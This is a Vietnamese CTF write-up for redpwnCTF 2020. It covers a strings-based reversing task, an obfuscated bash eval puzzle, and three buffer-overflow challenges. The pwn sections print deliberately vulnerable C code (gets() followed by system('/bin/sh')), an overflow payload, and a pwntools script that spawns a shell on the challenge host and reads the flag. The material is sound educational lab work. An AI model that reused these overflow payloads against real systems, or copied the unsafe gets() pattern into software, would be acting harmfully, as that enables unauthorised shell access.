## 1. Ropes

Đây là bài reverse engineer, một trong những dạng mình sợ hãi nhất T^T

Tuy nhiên bài này lại ở mức rất căn bản. Bằng cách sử dụng radare2 kiểm tra hàm printf, bạn có thể dễ dàng thu được ngay được flag.
Một cách đơn giản hơn là sử dụng câu lệnh kiểm tra string trong file

![](https://images.viblo.asia/380154f3-2a4e-4255-862f-f4c52eed712e.png)

 flag{r0pes_ar3_just_l0ng_str1ngs}
 
 ## 2. UglyBash
``` bash
 ${*%c-dFqjfo}  e$'\u0076'al "$(   ${*%%Q+n\{}   "${@~}" $'\160'r""$'\151'$@nt"f" %s   ' }~~@{$  ")   }La?cc87J##@{$   ;   }  ;  }8CC3vD/qX$t/*{$   }~~*{$   "}] "}^@{$"  y4R2SV$   "}cIqe[\(\%@{$" "}xk:W=Y2##@{$" [JzbY6E{$"   s%   ft'"'"'n'"'"''"'"'i'"'"'r\p  { ; }*!{$ ]  )e#22+)2}8Kr6>#*{$#82*01#3}^*{$((   [$ "};(\S-[\/@{$"   "},@{$"   ]  )71}|$1+d/$_dj/*{$#8+)2#16*1"}xp.{\$Z~[\%@{$"#}~*{$7"1"-((  [$ "@$"  "}oMAHn%%@{$"   ))  )0"1"01"}^@{$"#4}]\oh>-%%@{$+)"a"1#21"-"+l#"1""5"-})\+{\$rMTE%%@{$((   (($ }Omm"\V#*{$   }8z<TPr/*{$   ]   ))11"#"2+)"2""#""7""5"-"}qJ)\)\!\{\#/Ije>VU//@{$"-2}_axM-*/*{$#"7""3"(-(-( [$ }f9~U//*{$  }#Jgkvc#@{$   ))  )1#}7e[\Trh{\//@{$4+)0#62*0#}*{$"9"(( (($ }S(\{\0)\##@{$   ] )21"}jAVg1-%%@{$""#"5+)"1"1#}*{$4}*{$-*"0"1#"}~~@{$""3"-((   [$   }^^*{$   ]   )11#}*!{$"3"+)1*$#93*2#"6"5"@$"((   [$  }0c;x]\^Y//*{$  })\mei/b6B1atD)\//*{$  ]  )1"1"0001#2"}fhF`\x/s77vTa[\/@{$"+)0*$#}R"\>(\/RTS8//*{$"6"+l"#"03-((  [$ }^^@{$ ))   ))31"#"5+)11#7--00"}&*]\7//@{$"1#2}`\g]\<Roj/}\~(\<Qq/*{$(-(-(  (($  }~@{$  ))   )"1""#"5}mR&<7r/}\dC!\s*k/*{$3+)i#65-6"1"#}NojyN70T##*{$92}@!{$((  (($  },,*{$ ]  )i}Ym5{\y##@{$#}!\a.8/*{$"0"2},,*{$+)01#4+"b"#94}*{$-((  [$   }@{$   }~*{$ )) )52#8+)0#62*0#05(( (($  })\C62X/*{$  }mibf/*{$ )) )"4"2"#"6}~f`\^/@{$1}3NKi^FgW/*{$+)2}="\ulQ;/*{$"#"7}@!{$3-+k#35-((   (($  }*{$ }*{$  ] )i#16+)01#3*11#2}?L7X>/~^MeZH/@{$-((   [$  *$  }@{$   ))  )222#3+)11},,@{$#"2"*1"1"#4-((   (($   "}@{$" }*!{$ ]   )d#53}e~+uz61###@{$+)0}~~*{$01#2--2"1""#"3((   [$ }~~*{$   ))   )j"}^^@{$"#"},@{$"0}~*{$3+)11#4-}ml;.##@{$+"1"#8}"\r"\>cohJ/*{$4(( (($   }*!{$   )) )"a"1"#""1"5+)03#7-e}^^*{$#12-((  (($ "}~@{$"  ))  ))22"1"#3+)2#"}Y9cefj9%%@{$"41-*$-"y"#84(-(-(   (($   }^^@{$   ))   )011}~~@{$1},,*{$#2+)"1"#52*11#3-}^^*{$(( (($  }*{$ ]   ))0#"1"1+)0#04*0"#"2"},,@{$"1}*!{$(-(-( [$   }~~@{$ ))   )43#2"}gC@u/@{$"1+)"1"1}pQCP//*{$#2-}^@{$*01#*$8(( (($ }dlz"\T%%*{$  },h]\rj`\}\/RPQto"\/*{$   )) ))1#2}Vf}\]\Nu##@{$1+)11"#"2--0})\HIZ/*{$#05(-(-(  (($   },,*{$ }~~@{$ ))  )"a"#"6"3"}TIP]\@V##@{$"+)2}`\.\%Qxt/?:4,/@{$#02-*01#3-}{\Di6HUx@%@{$((  (($ "}~@{$" }34v@##*{$   ]  ))11#"5"+)h"}BdoI#@{$"1#1}t*f+fWlA//*{$2+2}~~*{$"1"#},,*{$5-(-(-(   [$   };y$!\M8##@{$  ))   )1#"7""1"+)0*$"#""1"3*0#5}*{$1"}Rw6a//@{$"(( (($   }Q-Vf9d%%*{$  ))   )1},,*{$#15+)0}+lDQf%@{$#"2"*0#74((  (($   }_%$KT9f/iTW~$_/*{$  @$  ]   )"m"#3},@{$"3"+)1"1"#2-*0#"5"1(( [$  "},@{$"   }TX`\`\%%@{$ ] )"1"1#5"}FE=UU=W./&<"\8l7/@{$"+)0#3*01#3-((   [$ }*{$   }aO;R"\w/9jJF1//*{$   ]   )"2"1#"}9uT]\j1f;##@{$""6"+)j#"7"4-"}^^@{$"-b#14-((   [$   }^^*{$ }~~*{$ )) ))1"#"34+)"0"1#}exP"\/TG!\)\T!\?//@{$6+1}*!{$#0}<7V&/*{$6-(-(-(   (($ }Mi@S<]\Q#*{$ }^^*{$   ]   )2}}\2jz]\G49/#dn>8/*{$2#"}<FTeK&n,//@{$"3"},,@{$"+)1#3-+00}I3cO.O;Z%%@{$"1"#"2"-},*{$(( [$ }B;h_1VnC%%*{$   "}@{$"  ]  )01}*{$#3+)1#*$8"3"--02#4((  [$  }.\np,/?{\~b03//*{$  "},@{$" ))  ))02#4+)"n"#}SPKP8tw##@{$45--1"#"03(-(-(  (($  "}@{$"   ]   ))n"#"14+)s#44+2}@{$2#}~*{$8}7Qq~iq%%*{$(-(-(   [$   *$   ]   )21"#"4+)n"}~@{$"#}\\@<f$4/*{$45--"1"2"#"3-(( [$  }@{$ }*{$ ))   )41#"3"1+)0"#"15*11#"6"(( (($   },,@{$ ]   )d#}t_=_//*{$8}ha5]\78/*{$"1"+)01#3"-"*1"}G2T~wh2##@{$""#"64-(( [$  }^^@{$   }.T9P_8Gv//*{$ ]   )2"#"73"}$oE?##@{$"+)1},,*{$"1"#}K.o%o$t/uR@fekB#/@{$2-"0""1"#}@bCU%*{$4((  [$  "}3nB?u8fG//@{$" ))  )"3""2""#"11"@$"+)0"}~@{$"1#4-+a#5"4"-((  (($ }~y?mRx/BM"\H]\//*{$  "}4^4rR/@{$" ]   )"G"#74}~@{$+)2#52}@!{$"-"*a#7"1"((  [$  }@!{$ }~~*{$   ]  ))1#84+)31#5+h#03(-(-(  [$   }&+?82EU%%*{$   }@!{$   ]   )l"#""3"2+)1}~*{$#21*0"}4[\P!\/|Ec{\e/@{$"1}*{$"#"5-((  [$ }:p-c^h+/:r#lsa//*{$ }*{$ ))  )00}@!{$1#}BFcS!\%@{$2+)1#"0"6*1#}~~*{$71-(( (($  }~~*{$ }"\&`\QS*%*{$   ]   )z"#"44+)11"#""5"-*2#4"2"((   [$   "}^^@{$" }RU*x9!\22/ySk%Ir/@{$ ))  )e"#"0"5"+)2#7"2"*"1"1#2"-"(( (($  }*{$ }LNt)\,//@{$ ))   ))0#}}\TMHUEV//*{$0}{\^WK!\##*{$6+)11#6-}ahZD^2~/:C,Io\C/*{$-"1"#65-"}H@zpzY8%@{$"(-(-(   (($  "}QrL2J\~%%@{$"  "}n(\7?)\)\J%%@{$"  ]   )0"1""#"11+)0#"8"2-11}*{$"#"4((  [$   }(\L-.D:/.41yxK]\//*{$  ]   ))21"#"7+)2#24--"f""#"32(-(-(  [$ },*{$ }@!{$ ] )22#81}^*{$+)1"1"#4}~*{$"-"*001#}*{$2(( [$ }^^@{$   },,@{$   ] )j},,*{$#"}u7=$6]\/o43H//@{$"2"5"+)1"1""1""#"2-101#2-((  [$  }$Wil##@{$  }l=:G>(\-#@{$  ] ))0#75}~~@{$+)1"#""9"+1"}JZ2I7=&/@{$""1"#}~~*{$3(-(-(  [$  ni  y4R2SV  rof &&   },,@{$  )  }^*{$  g  }^^*{$ y   }g$U-b9%@{$   j   }*!{$   n }~@{$  *$  u   "}(\whfI/@{$"  "}@{$"  z  }RH|<=z##@{$   }~~@{$  '"'"'ax\'"'"'$   }^^@{$  a }~*{$ }dS^Db6G}\%*{$   h   }@{$   }^*{$ r  "}m&Jk:b?/WBG02h}\_/@{$"  \ }T|qd//*{$  }OM`\6.o%@{$   {\  }H%ynnO(\u//*{$   }g8Gv|R~/*{$  _\  }-:zfUz%%*{$ }\   })\#?1{\OK/@{$ *$  i  }__b5W:RE//@{$  s   }%<Oy{\I//*{$ }"\-iPfz]\g/ug|0w8/*{$   l }L#vh$/{\wLz8/@{$ }60-tI0<%%*{$ 3  "}^@{$" o }euc*##@{$   c  }~~*{$  }~~*{$  d }_h)\)\{\/i$V2/@{$   e   *$   }(\&`\C?*3%%@{$   ,\ "}@{$" }~@{$  t   "},@{$"   }^^*{$ #\  }*^RXtV##*{$   m  "}@{$"   f "},@{$"   (=JzbY6E     ($"  <<< },,*{$   }C0#Y%%*{$  HSAB$ "}|=1SW.//@{$"   "@$" '  ${*,} ${@/;mO4/qc~&y} |  ${@/a\{oy_BGF/*:wJ}   ${@##~@pBeI}   "r"""ev   ${*~}  ${*%K^vf&^3<}  ;  ${*#SBvLg=k\[}  ${*^}    )"   ${!@}
``` 
Quan sát 1 chút bạn sẽ thấy được chuỗi thứ 2 là eval. Chuyển thử sang echo và run lại xem có gì nào

```bash
"$@"   "${@//.WS1=|}" $BASH  ${*%%Y#0C}   ${*,,} <<<  "$(     E6YbzJ=(   "${@,}" f   "${@}"  m   ${*##VtXR^*}  \# ${*^^}   "${@,}"   t  ${@~} "${@}" \,   ${@%%3*?C\`&\(}   $*   e   ${@/2V$i/\{\)\)h_} d  ${*~~}  ${*~~}  c   ${@##*cue} o "${@^}"  3 ${*%%<0It-06} ${@/8zLw\{/$hv#L} l   ${*/8w0|gu/g\]zfPi-\"} ${*//I\{yO<%}   s  ${@//ER:W5b__}  i  $* ${@/KO\{1?#\)}   \} ${*%%zUfz:-}  \_  ${*/~R|vG8g}   ${*//u\(Onny%H}  \{   ${@%o.6\`MO}  ${*//dq|T} \  "${@/_\}h20GBW/?b:kJ&m}"  r ${*^}   ${@}   h   ${*%\}G6bD^Sd} ${*~} a  ${@^^}   $'\xa'  ${@~~}   ${@##z=<|HR}  z  "${@}"  "${@/Ifhw\(}"   u  $*  ${@~} n   ${!*}   j   ${@%9b-U$g}   y ${*^^}  g  ${*^}  )  ${@,,}   && for  VS2R4y  in  $[  (-(-(3${*~~}#"1""${@/&=7I2ZJ}"1+"9""#"1)+${@~~}57#0)) ]  ${@#-\(>G:=l}  ${@##liW$}  $[  ((-2#101-2"#""1""1"1)+"5"2"${@//H34o/\]6$=7u}"#${*,,}j) ]   ${@,,}   ${@^^} $[ ((2${*}#100*"-"${*~}4#"1"1)+${*^}18#22) ] ${!@} ${*,} $[  (-(-(23"#""f"--42#2)+7"#"12))   ]  ${*//\]Kxy14./:D.-L\(}   $[  ((4"#"${*}11-2"8"#0)+11"#""1"0)   ]  "${@%%J\)\)?7\(n}"  "${@%%~\J2LrQ}"  $((   (-(-("${@%8Yzpz@H}"-56#"1"-${*/C\oI,C:/~2^DZha}-6#11)+6${*##\!KW^\{}0${*//VEUHMT\}}#0))   )) ${@//,\)tNL} ${*}  $(( (("-"2#1"1"*"2"7#2)+"5"0"#"e)  )) ${@/rI%kSy/22\!9x*UR} "${@^^}"   $[   (("2"4#2*-"5""#"11)+44"#"z)   ]   ${*%*SQ\`&\"} ${*~~}  $(( ((-17${*~~}#1*6"0"#1)+2${@%\!ScFB}#1${!@}00)  )) ${*} ${*//asl#r:/+h^c-p:} $[  ((-5"#"${*}1"${@/e\{cE|/\!P\[4}"0*12#${*~}1)+2"3""#"l)   ]   ${!@}   ${*%%UE28?+&}   $[  (-(-(30#h+5#13)+48#1))  ]   ${*~~} ${!@}  $[  (("1"7#a*"-"${!@}25#2)+${@~}47#"G")   ] "${@/Rr4^4}"  ${*//\]H\"MB/xRm?y~} $((  ((-"4"5#a+-4#1"${@~}"0)+"$@"11"#""2""3")  )) "${@//Gf8u?Bn3}"  $[  ((4${*%UCb@}#"1""0"-2${@/#Bkef@Ru/t$o%o.K}#"1"${*,,}1)+"${@##?Eo$}"37"#"2)   ] ${*//vG8_P9T.}   ${@^^}  $[ ((-46"#""${@##2hw~T2G}"1*"-"3#10)+"1"${*/87\]5ah}8${*//_=_t}#d)   ] ${@,,}   $(( (("6"#11*51"#"0)+1"3"#14)   )) ${*} ${@}  $[ ((-3"#"2"1"--54${*/4$f<@\\}#"${@~}"n)+4"#"12)   ]   $*   $[   (-(-(${*%%qi~qQ7}8${*~}#2${@}2+44#s)+41"#"n))   ]   "${@}"  $((  (-(-(30"#"1--54${@##wt8PKPS}#"n")+4#20))  )) "${@,}"  ${*//30b~\{?/,pn\.}  $[  ((4#20--"3"8$*#1)+3#${*}10)  ]  "${@}"   ${*%%CnV1_h;B} $[ ((${*,}-"2"#"1"${@%%Z;O.Oc3I}00+-3#1)+"${@,,}"3"${@//,n&KeTF<}"#2${*/8>nd#/94G\]zj2\}}2)   ]   ${*^^} ${*#Q\]<S@iM} $((   (-(-(-6${*/&V7<}0#${!*}1+6${@//?\!T\)\!GT/\"Pxe}#1"0")+43"#"1)) )) ${*~~} ${*^^}   $[   ((-41#b-"${@^^}"-4"7"#j)+"6""${@##;f1j\]Tu9}"#1"2")   ]   ${*//1FJj9/w\"R;Oa}   ${*} $[   ((-3#10*3#0)+"${@/7l8\"<&/.W=UU=EF}"5#1"1") ] ${@%%\`\`XT}   "${@,}"  $[ ((1"5"#0*-2#"1"1)+"3"${@,}3#"m")   ]  $@  ${*/_$~WTi/f9TK$%_}   $((  ((47#0*"2"#${@%fQDl+}0)+51#${*,,}1)   ))  ${*%%d9fV-Q}   $(( (("${@//a6wR}"1${*}5#0*3"1""#"$*0)+"1""7"#1)   ))  ${@##8M\!$y;}   $[   (-(-(-5${*,,}#"1"${*~~}2+2${*//AlWf+f*t}1#1"${@#IodB}"h)+"5"#11))  ]   ${*##@v43} "${@~}" $((  ((${@%@xUH6iD\{}-3#10*-20#${@/,4:?/txQ%\.\`}2)+"${@##V@\]PIT}"3"6"#"a")  )) ${@~~} ${*,,}   $((  (-(-(50#${*/ZIH\)}0--2"#"11)+1${@##uN\]\}fV}2#1)) ))   ${*/\"otQPR/\}\`jr\]h,}  ${*%%T\"zld} $(( ((8$*#10*${@^}-2#${*//PCQp}1"1")+1"${@/u@Cg}"2#34)   )) ${@~~}   $[ (-(-(${!*}1"${@,,}"2"#"0*40#0)+1"1"#0))   ] ${*}  $(( ((${*^^}-3#11*25#"1")+2#${*,,}1${@~~}110)   ))   ${@^^}   $((   (-(-(48#"y"-$*-14"${@%%9jfec9Y}"#2)+3#"1"22))  ))  "${@~}" $((  ((-21#${*^^}e-7#30)+5"1""#"1"a") ))   ${!*}   $(( ((4${*/Jhoc>\"r\"}8#"1"+${@##.;lm}-4#11)+3${*~}0"${@,}"#"${@^^}"j)   ))   ${*~~} $[   ((3"#""1"2--2#10${*~~}0)+${@###16zu+~e}35#d)   ] ${!*} "${@}"   $((   ((-4#"1"1*"2"#${@,,}11)+3#222)  ))   ${@}  $*  $[   ((-${@/HZeM^~/>X7L?}2#11*3#10)+61#i) ]  ${*} ${*}  $((   ((-53#k+-3${!@}7"#"${*/;Qlu\"=}2)+${*/WgF^iKN3}1${@/^\`f~}6"#"2"4") )) ${*/fbim}  ${*/X26C\)}  $(( ((50#0*26#0)+8#25) )) ${*~}   ${@}   $[  ((-${*}49#"b"+4#10)+${*,,}2"0"${*/8.a\!}#${@##y\{5mY}i)  ] ${*,,}  $((  ((${!@}29${*##T07NyjoN}#"1"6-56#i)+3${*/k*s\!Cd\}/r7<&Rm}5"#""1")   ))  ${@~}  $((  (-(-(${*/qQ<\(~\}/joR<\]g\`}2#1"${@//7\]*&}"00--7#11)+5"#"13))   )) ${@^^} $[  ((-30"#"l+"6"${*//8STR/\(>\"R}#$*0)+"${@/\[aTv77s/x\`Fhf}"2#1000"1"1)  ]  ${*//\)Dta1B6b/iem\)}  ${*//Y^\]x;c0}  $[   (("$@"5"6"#2*39#$*1)+"3"${!*}#11)   ]   ${*^^}   $[   ((-"3""${@~~}"#1"0"*-${*}4${*}#1"1")+5"#""${@%%-1gVAj}"12) ]   ${@##\)0\{\(S} $(( (("9"${*}#0*26#0)+4${@//\{hrT\[e7}#1)  ))   ${@#cvkgJ#}  ${*//U~9f} $[ (-(-("3""7"#${*/*-Mxa_}2-"${@//UV>ejI/#\{\!\)\)Jq}"-"5""7""#""2")+2"#"11))   ]   ${*/rPT<z8}   ${*#V\"mmO} $((   ((${@%%ETMr$\{+\)}-"5""1"#l+"-"12#1"a")+${@%%->ho\]}4#"${@^}"10"1"0)  ))   "${@%%nHAMo}"  "$@" $[  ((-"1"7${*~}#"${@%\[~Z$\{.px}"1*61#2)+8#${*/jd_$/d+1$|}17)  ]   "${@,}"   "${@/\[-S\(;}" $[   ((${*^}3#10*28#${*#>6rK8}2)+22#e)  ] ${!*} ; {  p\r'i''n'tf   %s   "${E6YbzJ[ "${@##2Y=W:kx}" "${@%\(\[eqIc}"   $VS2R4y  "${@^}" ]}"   ${*~~}   ${*/t$Xq/Dv3CC8}  ;  }   ;   ${@##J78cc?aL}   )"  ${@~~}
```

Thoạt nhìn có vẻ không thay đổi nhiều, tuy nhiên để ý kỹ hơn bạn sẽ thấy chuỗi sinh ra là reverse của chuỗi ban đầu. 

Thử nghiệm bỏ đi 1 số params ở đầu và echo phần còn lại ra, bạn sẽ thu được flag

![](https://images.viblo.asia/c76783d5-a597-49af-9acd-1b3d85780cf8.png)


## 3. Coffer-overflow-0
Sau đây là các bài dạng pwn mà mình chưa làm bao giờ :cry:. Sau một hồi google cật lực, mình cũng rút ra được các cách làm các bài này ở dạng siêu cơ bản. Trước hết, cần chuẩn bị IDA Pro hoặc gdb

Đề bài lần này rất may mắn có cho cả file source code C và 1 chương trình đã compile sẵn. Hãy cùng nhìn vào file coffer-over-flow-0.c xem có gì nào

``` C
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);
  if(code != 0) {
    system("/bin/sh");
  }
}


```
Hmm.. với những bài ban đầu có khả năng sử dụng buffer overflow để lấy flag. Mình sẽ verify lại bằng gdb với file executable coffer-overflow-0

![](https://images.viblo.asia/b661727b-58c7-4c0b-a3bf-154d77a6a81d.png)

Quả đúng như dự đoán. Kiểm tra sâu vào hàm main ta thấy được

![](https://images.viblo.asia/03f88633-178d-4725-a8ce-bbf3aaab9e4f.png)

Sau 3 lệnh set buffer và 2 câu lệnh puts để in ra 2 chuỗi của chương trình, ở địa chỉ 0x00000000004006db ta có thanh ghi \[rbp-0x20\]. Qua lệnh gets, dữ liệu được trữ trong \[rbp-0x8]. 
Từ đó tính được offset `0x20 + 0x8 = 24`. 

Vậy để thực hiện buffer overflow đơn giản chỉ bắn 1 chuỗi dữ liệu dài hơn 24 ký tự là được.
![](https://images.viblo.asia/4a8df56c-b58c-4f83-9fde-54875e375a27.png)


## 4. Coffer-overflow-1

``` C
#include <stdio.h>
#include <string.h>

int main(void)
{
  long code = 0;
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);
  if(code == 0xcafebabe) {
    system("/bin/sh");
  }
}
```

Bài này cũng tương đối giống với bài coffer-overflow-0. Tuy nhiên phần bit cần overflow thay vì 0 như trước thì giờ phải = 0xcafebabe. Cũng với các lệnh tương tự như trên.

Lần này payload sẽ là "a"\*24  và chuỗi 0xcafebabe dưới dạng byte

Payload : 'aaaaaaaaaaaaaaaaaaaaaa\xbe\xba\xfe\xca'

 ![](https://images.viblo.asia/8cf8f416-9cef-4d7d-834c-23fd848b38a9.png)

 Tuy nhiên khá bất ngờ khi payload không cho ra kết quả. Ở đây có khả năng do phần cuối của chuỗi không nhận được dưới dạng byte
 
 Ok fine, mình có ăn mày được 1 đoạn code nhỏ để bắn thử đúng payload vừa xong
 
 ```python
 from pwn import *
flag = p32(0xcafebabe)
offset = 24

r = remote("2020.redpwnc.tf", 31255)
print(r.recv(1024).decode())
print(r.recv(1024).decode())
r.sendline(b"a"*offset + flag)
r.sendline("cat flag.txt")
print(r.recv(1024).decode())
 ```
 Và kết quả thu được
![](https://images.viblo.asia/1ed7c7d5-bf10-46c6-bcfa-4dfd288dc5b5.png)

## 5. Coffer-overflow-2
Kiểm tra source code
``` C
#include <stdio.h>
#include <string.h>

int main(void)
{
  char name[16];
  
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  puts("Welcome to coffer overflow, where our coffers are overfilling with bytes ;)");
  puts("What do you want to fill your coffer with?");

  gets(name);
}

void binFunction() {
  system("/bin/sh");
}
```

Có vẻ khó nhằn hơn rồi, để buffer overflow có thể xảy ra cần phải tìm đến hàm binFunction.
![](https://images.viblo.asia/24cc249a-6200-43b6-9722-43af3d3b1258.png)

Sử dụng gdb để tìm tới địa chỉ hàm binFunction tại 0x04006e6 cùng với offset 24 tương tự cách tính bên trên

Tada!

![](https://images.viblo.asia/06574deb-26f7-42ba-b150-3cce690bba72.png)

Hết rồi, cảm ơn các bạn đã đọc. 
Phần 1 của senpai siêu gánh team có thể tham khảo tại [đây](https://viblo.asia/p/redpwnctf-2020-writeup-12-yMnKMvEAZ7P#_pwn-18)